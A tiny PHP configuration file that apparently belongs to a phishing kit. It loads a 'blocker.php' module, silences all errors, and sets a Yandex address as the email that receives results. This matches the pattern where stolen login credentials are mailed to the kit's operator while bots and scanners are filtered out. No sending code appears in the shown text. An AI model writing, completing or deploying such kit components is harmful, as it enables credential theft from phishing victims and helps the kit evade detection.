<?php
include('blocker.php');
error_reporting(0);
$ur_email   = "psurest1@yandex.com";
define("EMAIL", "$ur_email");
?>